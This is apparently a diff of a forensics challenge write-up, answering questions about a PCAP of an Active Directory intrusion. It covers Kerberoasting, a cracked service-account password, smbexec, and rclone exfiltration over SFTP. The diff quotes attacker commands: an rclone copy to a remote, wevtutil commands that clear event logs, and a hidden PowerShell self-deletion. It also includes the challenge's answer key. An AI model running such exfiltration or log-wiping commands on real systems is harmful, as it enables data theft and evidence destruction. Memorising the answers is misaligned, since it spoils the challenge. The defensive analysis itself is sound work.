@@ -229,7 +229,7 @@ For blue team triage, three operation types carry the highest investigative prio
 - `searchResEntry` (`4`) reveals what data the server returned to the client. This is where sensitive data exfiltration surfaces in a PCAP, including the `tempadmin` credential discovery at frame `3725` in this case, consistent with MITRE ATT&CK technique T1087.002 (Account Discovery: Domain Account).
 - `modifyRequest` (`6`) reveals attacker-driven changes to AD objects, such as adding a compromised account to a privileged group or altering account properties, consistent with T1098 (Account Manipulation).
 
-Q8- The threat actor attempted to use this credential to authenticate to the domain controller over SMB. What NTSTATUS response did the domain controller return?
+**Q8**- The threat actor attempted to use this credential to authenticate to the domain controller over SMB. What NTSTATUS response did the domain controller return?
 
 Answer: `STATUS_ACCOUNT_DISABLED`
 
@@ -247,7 +247,7 @@ Frame 4778: Session Setup Response, Error: STATUS_ACCOUNT_DISABLED
 NTSTATUS: STATUS_ACCOUNT_DISABLED (0xC0000072)
 ```
 
-Q9- BloodHound is a powerful Active Directory reconnaissance tool that uses LDAP queries to map trust relationships, permissions, and attack paths within a domain. The collection phase begins with an LDAP Bind Request and concludes with an LDAP Unbind Request, signaling the end of data gathering. Identifying this boundary packet helps determine when the threat actor completed their domain enumeration. At which packet number does the LDAP Unbind Request occur, indicating the completion of the BloodHound collection?
+**Q9**- BloodHound is a powerful Active Directory reconnaissance tool that uses LDAP queries to map trust relationships, permissions, and attack paths within a domain. The collection phase begins with an LDAP Bind Request and concludes with an LDAP Unbind Request, signaling the end of data gathering. Identifying this boundary packet helps determine when the threat actor completed their domain enumeration. At which packet number does the LDAP Unbind Request occur, indicating the completion of the BloodHound collection?
 
 Answer: `5175`
 
@@ -270,7 +270,7 @@ LDAP protocolOp values:
   5 = searchResDone
 ```
 
-Q10- Kerberoasting is a post-exploitation technique where an attacker requests Kerberos service tickets (TGS) for accounts with Service Principal Names (SPNs). The encrypted portion of these tickets can be extracted and cracked offline to recover service account passwords, which often have elevated privileges. After completing their initial reconnaissance, the threat actor performed a Kerberoasting attack to escalate their privileges. How many service account hashes were the threat actor able to retrieve?
+**Q10**- Kerberoasting is a post-exploitation technique where an attacker requests Kerberos service tickets (TGS) for accounts with Service Principal Names (SPNs). The encrypted portion of these tickets can be extracted and cracked offline to recover service account passwords, which often have elevated privileges. After completing their initial reconnaissance, the threat actor performed a Kerberoasting attack to escalate their privileges. How many service account hashes were the threat actor able to retrieve?
 
 Answer: 5
 
@@ -301,7 +301,7 @@ krbtgt,WOWZA.LOCAL,wowza.local\svc_dpm
 krbtgt,WOWZA.LOCAL,wowza.local\svc_sharepoint
 ```
 
-Q11- Following the Kerberoasting attack, the threat actor attempted to crack the captured service ticket hashes offline. Service accounts often have weaker passwords than expected, making them vulnerable to dictionary attacks. Successfully cracking one of these hashes would provide the attacker with elevated privileges within the domain. What was the username of the service account whose hash was successfully cracked, and what password was recovered?
+**Q11**- Following the Kerberoasting attack, the threat actor attempted to crack the captured service ticket hashes offline. Service accounts often have weaker passwords than expected, making them vulnerable to dictionary attacks. Successfully cracking one of these hashes would provide the attacker with elevated privileges within the domain. What was the username of the service account whose hash was successfully cracked, and what password was recovered?
 
 Answer: `svc_backup`:`1180200022358`
 
@@ -332,7 +332,7 @@ svc_backup:1180200022358
 # Frame 6765: bindRequest(1) "<ROOT>", NTLMSSP_AUTH, User: wowza.local\svc_backup
 ```
 
-Q12- With elevated privileges obtained from the cracked service account, the threat actor now possessed the ability to modify Active Directory objects. The attacker leveraged these privileges to re-enable temporary administrator account found earlier. When did this account modification take place?
+**Q12**- With elevated privileges obtained from the cracked service account, the threat actor now possessed the ability to modify Active Directory objects. The attacker leveraged these privileges to re-enable temporary administrator account found earlier. When did this account modification take place?
 
 Answer: `2025-11-25 11:03`
 
@@ -391,7 +391,7 @@ ldap.protocolOp == 0
 ldap.sasl_buffer_length
 ```
 
-Q13- With administrative access to the domain controller, the threat actor began preparing for data exfiltration. Attackers typically stage files in accessible network shares before transferring them to external infrastructure. Identifying the staging location helps understand the scope of data targeted for theft. What is the name of the file share accessed by the threat actor to stage the files prior to exfiltration?
+**Q13**- With administrative access to the domain controller, the threat actor began preparing for data exfiltration. Attackers typically stage files in accessible network shares before transferring them to external infrastructure. Identifying the staging location helps understand the scope of data targeted for theft. What is the name of the file share accessed by the threat actor to stage the files prior to exfiltration?
 
 Answer: `IT`
 
@@ -418,7 +418,7 @@ smb2.cmd == 3 && frame.number > 6859
 # clean.ps1 -- removes rclone, clears System/Security/Application event logs
 ```
 
-Q14- What is the SHA-256 hash of the compressed file uploaded by the threat actor to this share?
+**Q14**- What is the SHA-256 hash of the compressed file uploaded by the threat actor to this share?
 
 Answer: C9DD39E0E0C11A9F029DD31E9E47614AF4650D1853B55DD3F3D1C504F22B5F38
 
@@ -444,7 +444,7 @@ smb2.cmd == 9 && smb2.filename == "exfil.zip"
 Get-FileHash .\exfil.zip -Algorithm SHA256
 ```
 
-Q15- Analysis of the uploaded archive reveals the data exfiltration toolkit deployed by the threat actor. Understanding the exfiltration software and its configuration helps determine what data was targeted for theft. The tool was configured with a list of file extensions to specifically target during the collection phase. What is the name of the software used by the threat actor to perform data exfiltration, and how many file extensions was it configured to target?
+**Q15**- Analysis of the uploaded archive reveals the data exfiltration toolkit deployed by the threat actor. Understanding the exfiltration software and its configuration helps determine what data was targeted for theft. The tool was configured with a list of file extensions to specifically target during the collection phase. What is the name of the software used by the threat actor to perform data exfiltration, and how many file extensions was it configured to target?
 
 Answer: `rclone`, `14`
 
@@ -472,7 +472,7 @@ Get-Content .\exfil_extracted\rclone\include.txt
 # --filter-from include.txt --zip C:\Shares\exfil.zip
 ```
 
-Q16- Which protocol did the threat actor use for data exfiltration, and what username and password were used to authenticate?
+**Q16**- Which protocol did the threat actor use for data exfiltration, and what username and password were used to authenticate?
 
 Answer: SFTP, `johnattan`:`johnattan`
 
@@ -499,7 +499,7 @@ rclone.exe copy C:\Shares\exfil.zip johnattan: --progress
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-NoProfile -Command Start-Sleep -Seconds 2; Remove-Item -Path <scriptDir> -Recurse -Force"
 ```
 
-Q17- To facilitate data exfiltration, the threat actor used a well-known tool from the Impacket toolkit to obtain a semi-interactive shell on the domain controller. What is the name of this tool?
+**Q17**- To facilitate data exfiltration, the threat actor used a well-known tool from the Impacket toolkit to obtain a semi-interactive shell on the domain controller. What is the name of this tool?
 
 Answer: `smbexec`
 
@@ -558,7 +558,7 @@ smb2.filename == "__output" && frame.number >= 16624
 smb2.cmd == 5 && smb2.filename == "__output"
 ```
 
-Q18- When the threat actor executed commands using the tool discovered earlier, it generated a temporary batch file on the domain controller to run the command and then removed it. What was the name of this temporary file created during the exfiltration script execution?
+**Q18**- When the threat actor executed commands using the tool discovered earlier, it generated a temporary batch file on the domain controller to run the command and then removed it. What was the name of this temporary file created during the exfiltration script execution?
 
 Answer: `RKhBcFrQ.bat`
 
@@ -583,7 +583,7 @@ tshark.exe -r domainmess_evidence.pcapng \
 # 5. XEiPuqxv.bat  -- Remove-Item C:\Shares\IT\clean.ps1 -Force
 ```
 
-Q19- After the data exfiltration stage, the threat actor executed a cleanup script. According to the script, which Windows event logs were cleared? (List them in the order they appear in the script.)
+**Q19**- After the data exfiltration stage, the threat actor executed a cleanup script. According to the script, which Windows event logs were cleared? (List them in the order they appear in the script.)
 
 Answer: System, Security, Application
 
@@ -609,7 +609,7 @@ wevtutil cl "Application"  >$null 2>&1
 # Event logs cleared in order: System, Security, Application
 ```
 
-Q20- To understand the full timeline of the attack, it is important to determine when the threat actor completed their activity on the compromised system. Based on the remote execution tool activity (Q17), when was the final command executed by the threat actor on the domain controller?
+**Q20**- To understand the full timeline of the attack, it is important to determine when the threat actor completed their activity on the compromised system. Based on the remote execution tool activity (Q17), when was the final command executed by the threat actor on the domain controller?
 
 Answer: `2025-11-25 11:10`
 
